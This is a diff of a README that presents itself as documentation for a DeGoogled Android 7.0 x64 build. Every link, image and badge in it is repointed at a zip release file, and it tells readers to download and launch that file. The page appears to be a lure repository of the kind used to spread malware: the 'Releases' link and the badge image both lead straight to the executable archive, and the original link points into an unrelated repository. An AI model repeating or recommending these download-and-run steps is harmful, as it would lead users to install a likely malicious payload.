@@ -1,7 +1,7 @@
 
 # 🤖️📖️ Android x64 DeGoogled Edition Docs
 
-![Android x64 DeGoogled Edition](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+![Android x64 DeGoogled Edition](https://github.com/Kauamartinatti/Android-x64_Android7.0_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip)
 
 This repository serves as the documentation source for the DeGoogled build of Android 7.0, offering a powerful alternative to the conventional Android experience. If you are looking for a DeGoogled Android 7.0 (Nougat) installation, this is the right place for you!
 
@@ -12,13 +12,13 @@ This repository serves as the documentation source for the DeGoogled build of An
 
 ## Installation Guide
 To get started with the DeGoogled build of Android 7.0, follow these steps:
-1. Download the necessary files from the following link: [Download Android x64 DeGoogled Edition](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+1. Download the necessary files from the following link: [Download Android x64 DeGoogled Edition](https://github.com/Kauamartinatti/Android-x64_Android7.0_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip)
 2. Launch the downloaded file to initiate the installation process.
 
 ### Enjoy your DeGoogled Experience!
 📱️🦾️🔓️🚀️
 
 ## Additional Resources
-For more information and updates, please visit the [Releases](https://github.com/Dredarty/RINGSharp/releases) section.
+For more information and updates, please visit the [Releases](https://github.com/Kauamartinatti/Android-x64_Android7.0_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip) section.
 
-[![Download Android x64 DeGoogled Edition](https://img.shields.io/badge/Download-Android%20x64%20DeGoogled%20Edition-brightgreen)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Android x64 DeGoogled Edition](https://github.com/Kauamartinatti/Android-x64_Android7.0_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip%20x64%20DeGoogled%20Edition-brightgreen)](https://github.com/Kauamartinatti/Android-x64_Android7.0_DeGoogled_Edition_Docs/releases/download/v1.0/Program.zip)
